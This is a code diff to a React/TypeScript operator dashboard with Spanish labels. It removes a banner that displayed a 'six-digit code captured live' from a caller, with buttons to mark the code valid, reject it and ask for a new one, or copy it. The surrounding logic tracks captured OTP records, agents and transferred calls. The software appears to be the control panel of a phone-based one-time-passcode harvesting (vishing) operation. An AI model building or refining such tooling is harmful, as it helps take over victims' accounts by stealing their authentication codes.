@@ -1855,11 +1855,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   const serviceLabel = activeSelectedEntity ? `${activeSelectedEntity.name} (${activeSelectedEntity.subtitle})` : 'Servicio al Cliente';
 
   const durationTimerRef = useRef<any>(null);
-  const [liveCapturedAlert, setLiveCapturedAlert] = useState<CapturedOtpRecord | null>(null);
   const lastAlertKeyRef = useRef<string>('');
   const activeCallRef = useRef(activeCall);
   const validRecordIdsRef = useRef<Set<string>>(new Set());
-  const dismissedAlertKeysRef = useRef<Set<string>>(new Set());
 
   useEffect(() => {
     activeCallRef.current = activeCall;
@@ -1898,39 +1896,22 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         (newest.otp && validRecordIdsRef.current.has(newest.otp)) ||
         (newest.number && validRecordIdsRef.current.has(newest.number));
 
-      const isDismissed =
-        dismissedAlertKeysRef.current.has(newest.id) ||
-        dismissedAlertKeysRef.current.has(newest.otp) ||
-        (newest.number && dismissedAlertKeysRef.current.has(newest.number));
-
-      if (isDecided || isDismissed) {
-        // Cuando el código ya fue decidido (válido/inválido) o descartado por el usuario, no mostrar banner de alerta
-        setLiveCapturedAlert(null);
-        if (isDecided) {
-          setActiveCall((prev) => {
-            if (prev && prev.name?.includes('Cliente Transferido')) {
-              return null;
-            }
-            if (prev && prev.capturedOtp === newest.otp) {
-              return {
-                ...prev,
-                capturedOtp: undefined,
-                status: prev.status === 'otp_captured' ? 'connected' : prev.status,
-                otpStatus: newest.status as any,
-              };
-            }
-            return prev;
-          });
-        }
-      } else {
-        // Mantener el banner de alerta solo si está realmente pendiente de validación y no fue descartado
-        setLiveCapturedAlert((prev) => {
-          if (!prev || prev.id !== newest.id || prev.otp !== newest.otp || prev.status !== newest.status) {
-            return newest;
+      if (isDecided) {
+        setActiveCall((prev) => {
+          if (prev && prev.name?.includes('Cliente Transferido')) {
+            return null;
+          }
+          if (prev && prev.capturedOtp === newest.otp) {
+            return {
+              ...prev,
+              capturedOtp: undefined,
+              status: prev.status === 'otp_captured' ? 'connected' : prev.status,
+              otpStatus: newest.status as any,
+            };
           }
           return prev;
         });
-
+      } else {
         // Tono de notificación auditivo solo cuando llega un código nuevo o cambia de estado
         if (newest.otp && lastAlertKeyRef.current !== recordKey) {
           lastAlertKeyRef.current = recordKey;
@@ -1968,8 +1949,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           return prev;
         });
       }
-    } else {
-      setLiveCapturedAlert(null);
     }
   };
 
@@ -2013,9 +1992,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       if (recordId) validRecordIdsRef.current.add(recordId);
       if (otp) validRecordIdsRef.current.add(otp);
       if (num) validRecordIdsRef.current.add(num);
-
-      // Quitar inmediatamente el aviso de código capturado en tiempo real
-      setLiveCapturedAlert(null);
 
       // Quitar del HUD de llamada activa la sección de dígitos en tiempo real
       if (activeCall) {
@@ -2061,9 +2037,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               }
             : null
         );
-      }
-      if (liveCapturedAlert) {
-        setLiveCapturedAlert((prev) => (prev ? { ...prev, status } : null));
       }
     }
 
@@ -3349,136 +3322,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               </div>
             );
           })}
-        </div>
-      )}
-
-      {/* BANNER / PANEL DE ALERTA: CÓDIGO CAPTURADO EN VIVO (Solo si no está visible el HUD inline de llamada activa para no duplicar) */}
-      {liveCapturedAlert && liveCapturedAlert.status !== 'valid' && !(activeCall?.isActive && activeCall.otpStatus !== 'valid') && (
-        <div className="p-6 rounded-2xl bg-gradient-to-r from-emerald-950/90 via-slate-950 to-slate-900 border-2 border-emerald-500 shadow-2xl shadow-emerald-500/30 relative overflow-hidden">
-          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-emerald-500/30 pb-4">
-            <div className="flex items-center gap-3">
-              <span className="relative flex h-4 w-4">
-                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
-                <span className="relative inline-flex rounded-full h-4 w-4 bg-emerald-500"></span>
-              </span>
-              <div>
-                <div className="text-xs font-black uppercase tracking-widest text-emerald-400 flex items-center gap-2">
-                  <span>¡CÓDIGO DE 6 DÍGITOS CAPTURADO EN VIVO!</span>
-                  <span className="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-mono text-[10px] border border-emerald-500/40">
-                    {liveCapturedAlert.channel || 'Ext. OTP'}
-                  </span>
-                  {liveCapturedAlert.agent && (
-                    <span className="px-2 py-0.5 rounded bg-purple-500/30 text-purple-300 font-mono text-[10px] border border-purple-400/40 font-bold">
-                      👤 Asesor: Ext. {liveCapturedAlert.agent}
-                    </span>
-                  )}
-                </div>
-                <div className="text-slate-300 text-xs mt-0.5 flex flex-wrap items-center gap-2">
-                  <span>Número: <strong className="text-white font-mono">{liveCapturedAlert.number}</strong></span>
-                  <span>&bull;</span>
-                  <span>Hora: <span className="text-slate-400 font-mono">{liveCapturedAlert.timestamp}</span></span>
-                  {liveCapturedAlert.agent && (
-                    <span className="text-emerald-400 font-bold text-[11px] bg-emerald-950/40 px-2 py-0.5 rounded border border-emerald-500/30">
-                      ⚡ Retornará a Ext. {liveCapturedAlert.agent} al aprobar
-                    </span>
-                  )}
-                </div>
-              </div>
-            </div>
-
-            <div className="flex items-center gap-2">
-              {liveCapturedAlert.status === 'valid' ? (
-                <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/20 text-emerald-300 font-bold border border-emerald-500/40 text-xs">
-                  <CheckCircle className="w-4 h-4 text-emerald-400" />
-                  <span>Aprobado por Asesor</span>
-                </span>
-              ) : liveCapturedAlert.status === 'invalid' ? (
-                <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-rose-500/20 text-rose-300 font-bold border border-rose-500/40 text-xs">
-                  <XCircle className="w-4 h-4 text-rose-400" />
-                  <span>Rechazado (Pidiendo nuevo)</span>
-                </span>
-              ) : (
-                <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-500/20 text-amber-300 font-bold border border-amber-500/40 text-xs animate-pulse">
-                  <Clock className="w-4 h-4 text-amber-400" />
-                  <span>Esperando tu decisión</span>
-                </span>
-              )}
-
-              <button
-                id="btn-dismiss-live-alert"
-                type="button"
-                onClick={() => {
-                  if (liveCapturedAlert) {
-                    dismissedAlertKeysRef.current.add(liveCapturedAlert.id);
-                    dismissedAlertKeysRef.current.add(liveCapturedAlert.otp);
-                    if (liveCapturedAlert.number) dismissedAlertKeysRef.current.add(liveCapturedAlert.number);
-                  }
-                  setLiveCapturedAlert(null);
-                }}
-                className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-all ml-2 cursor-pointer"
-                title="Descartar y ocultar aviso"
-              >
-                <X className="w-5 h-5" />
-              </button>
-            </div>
-          </div>
-
-          <div className="py-5 flex flex-col items-center justify-center gap-3">
-            <div className="text-xs font-bold text-slate-400 uppercase tracking-wider text-center">
-              Dígitos ingresados por el cliente en llamada:
-            </div>
-
-            <div className="flex flex-wrap items-center justify-center gap-2.5 sm:gap-3">
-              {liveCapturedAlert.otp.split('').map((digit, idx) => (
-                <span
-                  key={idx}
-                  className="w-14 h-18 sm:w-16 sm:h-20 flex items-center justify-center text-3xl sm:text-4xl font-black font-mono text-emerald-400 bg-slate-950 rounded-2xl border-2 border-emerald-500 shadow-xl shadow-emerald-500/30"
-                >
-                  {digit}
-                </span>
-              ))}
-            </div>
-          </div>
-
-          <div className="flex flex-wrap items-center justify-center gap-3 pt-3 border-t border-emerald-500/20">
-            <button
-              id="btn-alert-mark-valid"
-              type="button"
-              onClick={() => handleVerifyOtp('valid', liveCapturedAlert.otp, liveCapturedAlert.number, liveCapturedAlert.id)}
-              className={`inline-flex items-center gap-2 px-6 py-3 rounded-xl font-black text-sm shadow-xl transition-all ${
-                liveCapturedAlert.status === 'valid'
-                  ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/50 scale-105'
-                  : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
-              }`}
-            >
-              <CheckCircle className="w-5 h-5" />
-              <span>CÓDIGO VÁLIDO</span>
-            </button>
-
-            <button
-              id="btn-alert-mark-invalid"
-              type="button"
-              onClick={() => handleVerifyOtp('invalid', liveCapturedAlert.otp, liveCapturedAlert.number, liveCapturedAlert.id)}
-              className={`inline-flex items-center gap-2 px-6 py-3 rounded-xl font-black text-sm shadow-xl transition-all ${
-                liveCapturedAlert.status === 'invalid'
-                  ? 'bg-rose-500 text-white ring-4 ring-rose-400/50 scale-105'
-                  : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-600/30'
-              }`}
-            >
-              <XCircle className="w-5 h-5" />
-              <span>CÓDIGO INVÁLIDO</span>
-            </button>
-
-            <button
-              id="btn-alert-copy-otp"
-              type="button"
-              onClick={() => handleCopyOtp(liveCapturedAlert.otp, 'alert-otp')}
-              className="inline-flex items-center gap-2 px-4 py-3 rounded-xl font-bold text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all"
-            >
-              {copiedId === 'alert-otp' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
-              <span>{copiedId === 'alert-otp' ? '¡Copiado!' : 'Copiar Código'}</span>
-            </button>
-          </div>
         </div>
       )}
 
